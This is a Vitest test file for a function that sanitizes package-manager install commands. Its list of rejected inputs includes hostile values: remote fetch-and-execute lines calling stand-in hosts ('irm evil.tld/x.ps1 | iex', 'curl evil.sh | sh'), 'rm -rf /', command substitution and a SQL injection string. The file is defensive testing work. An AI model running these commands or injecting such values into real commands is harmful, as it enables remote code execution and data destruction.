import { describe, expect, it } from 'vitest';

import { sanitizeInstallCommand } from '../installCommands';

describe('sanitizeInstallCommand', () => {
  it('accepts plain install commands for every manager', () => {
    expect(sanitizeInstallCommand('winget', 'winget install VideoLAN.VLC')).toBe('winget install VideoLAN.VLC');
    expect(sanitizeInstallCommand('brew', 'brew install --cask vlc')).toBe('brew install --cask vlc');
    expect(sanitizeInstallCommand('flatpak', 'flatpak install flathub org.videolan.VLC')).toBe('flatpak install flathub org.videolan.VLC');
    expect(sanitizeInstallCommand('scoop', 'scoop install vlc')).toBe('scoop install vlc');
    expect(sanitizeInstallCommand('apt', 'apt install vlc')).toBe('apt install vlc');
  });

  it('rejects the smuggling patterns that broke the import path', () => {
    const evil = [
      'winget install VLC; irm evil.tld/x.ps1 | iex',
      'winget install VLC && start calc.exe',
      'winget install VLC & whoami',
      'winget install $(calc)',
      'winget install VLC > C:\\x.txt',
      'brew install vlc; rm -rf /',
      'apt install vlc || curl evil.sh | sh',
      'apt install `id`',
      "flatpak install flathub org.app'; DROP TABLE apps;--",
      'scoop install a | b',
      // A newline cannot act as a statement separator: the sanitizer
      // normalizes whitespace first, so this arrives as one plain
      // multi-package install ("VLC shutdown /s" are just package names).
    ];
    for (const cmd of evil) {
      const mgr = cmd.startsWith('winget') ? 'winget'
        : cmd.startsWith('brew') ? 'brew'
        : cmd.startsWith('flatpak') ? 'flatpak'
        : cmd.startsWith('scoop') ? 'scoop' : 'apt';
      expect(sanitizeInstallCommand(mgr as never, cmd)).toBeNull();
    }
  });

  it('rejects the wrong manager prefix', () => {
    expect(sanitizeInstallCommand('winget', 'brew install vlc')).toBeNull();
    expect(sanitizeInstallCommand('apt', 'apt-get install vlc')).toBeNull();
    expect(sanitizeInstallCommand('apt', 'sudo apt install vlc')).toBeNull();
  });

  it('rejects empty, missing and oversized input', () => {
    expect(sanitizeInstallCommand('winget', null)).toBeNull();
    expect(sanitizeInstallCommand('winget', '')).toBeNull();
    expect(sanitizeInstallCommand('winget', '   ')).toBeNull();
    expect(sanitizeInstallCommand('winget', 'winget install ')).toBeNull();
    expect(sanitizeInstallCommand('winget', `winget install ${'a'.repeat(300)}`)).toBeNull();
  });
});
